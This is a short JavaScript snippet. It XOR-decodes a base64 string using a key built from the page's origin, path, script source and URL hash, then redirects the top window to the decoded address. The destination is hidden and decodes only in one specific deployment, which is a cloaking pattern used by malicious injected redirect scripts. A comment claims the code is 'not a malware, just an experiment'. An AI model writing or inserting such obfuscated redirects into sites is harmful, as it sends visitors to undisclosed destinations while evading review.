function xorStrings(a, b) {
    let result = '';
    // Determine the length of the shorter string to avoid errors.
    const len = Math.min(a.length, b.length);

    for (let i = 0; i < len; i++) {
        // Get the character codes (ASCII values) for the current characters
        const charCodeA = a.charCodeAt(i);
        const charCodeB = b.charCodeAt(i);

        // Perform the bitwise XOR on the character codes
        const xorResult = charCodeA ^ charCodeB;

        // Convert the result back to a character and append it to the result string
        result += String.fromCharCode(xorResult);
    }

    return result;
}

// this is not a malware, just an experiment, do not panic!

const key = JSON.stringify([location.origin, location.pathname, document.currentScript.src, location.hash.substring(19,49)]);
const href = 'OEoaGxkVXl9XWwhAAB0dB0pKAQwDGhgOEAhKR0BKCwsJCBVADh4KAlJFQAkfFQADVUZAQk8DBF0AHgFLFkscAwIe';
top.location.href = xorStrings(key, atob(href))
